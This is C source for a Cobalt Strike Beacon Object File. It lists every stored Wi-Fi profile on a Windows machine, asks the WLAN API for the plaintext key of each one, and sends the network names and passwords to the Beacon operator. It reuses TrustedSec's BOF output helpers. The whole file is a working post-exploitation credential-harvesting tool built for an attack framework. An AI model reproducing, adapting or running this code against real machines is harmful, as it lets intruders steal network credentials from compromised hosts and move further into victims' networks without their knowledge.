#include <windows.h>
#include <wlanapi.h>
#include <stdio.h>
#include <wtypes.h>
#include "wifipasswords.h"
#include "beacon.h"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

#define _CRT_SECURE_NO_WARNINGS



//START TrustedSec BOF print code: https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/common/base.c
#ifndef bufsize
#define bufsize 8192
#endif
char *output = 0;  
WORD currentoutsize = 0;
HANDLE trash = NULL; 
int bofstart();
void internal_printf(const char* format, ...);
void printoutput(BOOL done);

int bofstart() {   
    output = (char*)MSVCRT$calloc(bufsize, 1);
    currentoutsize = 0;
    return 1;
}

void internal_printf(const char* format, ...){
    int buffersize = 0;
    int transfersize = 0;
    char * curloc = NULL;
    char* intBuffer = NULL;
    va_list args;
    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args); 
    va_end(args);
    
    if (buffersize == -1) return;
    
    char* transferBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, bufsize);
	intBuffer = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, buffersize);
    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args); 
    va_end(args);
    if(buffersize + currentoutsize < bufsize) 
    {
        MSVCRT$memcpy(output+currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    } else {
        curloc = intBuffer;
        while(buffersize > 0)
        {
            transfersize = bufsize - currentoutsize;
            if(buffersize < transfersize) 
            {
                transfersize = buffersize;
            }
            MSVCRT$memcpy(output+currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if(currentoutsize == bufsize)
            {
                printoutput(FALSE); 
            }
            MSVCRT$memset(transferBuffer, 0, transfersize); 
            curloc += transfersize; 
            buffersize -= transfersize;
        }
    }
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, intBuffer);
	KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, transferBuffer);
}

void printoutput(BOOL done) {
    char * msg = NULL;
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if(done) {MSVCRT$free(output); output=NULL;}
}
//END TrustedSec BOF print code.



static void print_wstr(LPCWSTR wstr) {
    int len = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (len > 0) {
        char *buf = (char*)MSVCRT$malloc(len);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wstr, -1, buf, len, NULL, NULL);
        internal_printf("%s", buf);
        MSVCRT$free(buf);
    }
}

int go() {
	if(!bofstart()) return;
	
    DWORD clientVersion    = 2;  
    HANDLE hClient         = NULL;
    DWORD negotiatedVersion= 0;
    DWORD ret = WLANAPI$WlanOpenHandle(clientVersion, NULL, &negotiatedVersion, &hClient);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Probably WLAN AutoConfig service (WlanSvc) isn't running. Error code: %lu\n", ret);
        return 1;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    ret = WLANAPI$WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Probably no Wi-Fi adapters present or they're disabled. Error code: %lu\n", ret);
        WLANAPI$WlanCloseHandle(hClient, NULL);
        return 1;
    }
	
	internal_printf("[+] Found stored WiFi passwords:\n================================================================\n");
	
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        WLAN_INTERFACE_INFO *iface = &pIfList->InterfaceInfo[i];
        //internal_printf("\nInterface: %S\n", iface->strInterfaceDescription);

        PWLAN_PROFILE_INFO_LIST pProfList = NULL;
        ret = WLANAPI$WlanGetProfileList(hClient, &iface->InterfaceGuid, NULL, &pProfList);
        if (ret != ERROR_SUCCESS) {
            //BeaconPrintf(CALLBACK_ERROR, "WlanGetProfileList failed: %lu\n", ret);
            continue;
        }

        for (DWORD j = 0; j < pProfList->dwNumberOfItems; j++) {
            LPCWSTR profileName = pProfList->ProfileInfo[j].strProfileName;
            internal_printf("[SSID]:\t\t%S\n", profileName);

            LPWSTR profileXml = NULL;
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            ret = WLANAPI$WlanGetProfile(hClient, &iface->InterfaceGuid, profileName, NULL, &profileXml, &flags, NULL);
            if (ret != ERROR_SUCCESS) {
                //BeaconPrintf(CALLBACK_ERROR, "WlanGetProfile failed: %lu\n", ret);
                continue;
            }

            LPCWSTR keyTag = L"<keyMaterial>";
            LPWSTR pos = MSVCRT$wcsstr(profileXml, keyTag);
            if (pos) {
                pos += MSVCRT$wcslen(keyTag);
                LPWSTR end = MSVCRT$wcsstr(pos, L"</keyMaterial>");
                if (end) {
                    *end = L'\0';
                    internal_printf("[PASSWORD]:\t");
                    print_wstr(pos);
                    internal_printf("\n\n");
                } else {
                    internal_printf("[PASSWORD]:\tCould not parse data\n\n");
                }
            } else {
                internal_printf("[PASSWORD]:\tNo password required or password not stored\n\n");
            }

            WLANAPI$WlanFreeMemory(profileXml);
        }

        WLANAPI$WlanFreeMemory(pProfList);
    }

    WLANAPI$WlanFreeMemory(pIfList);
    WLANAPI$WlanCloseHandle(hClient, NULL);
	
	printoutput(TRUE);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Done!\n"); 
	
    return 0;
}



